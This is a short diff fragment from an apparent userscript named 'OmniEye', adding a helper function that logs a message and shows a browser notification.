-        showNotification(`Omni-Eye v${OMNIEYE.version} ready`);
-    })();
-})();
+    function showNotification(msg) {
+        console.log(`[OmniEye] ${msg}`);
+        try {
+            GM_notification({ text: msg, title: 'OmniEye UNIT 8402', timeout: 3000 });
+        } catch(e) {}
+    }
+
+    // ==========
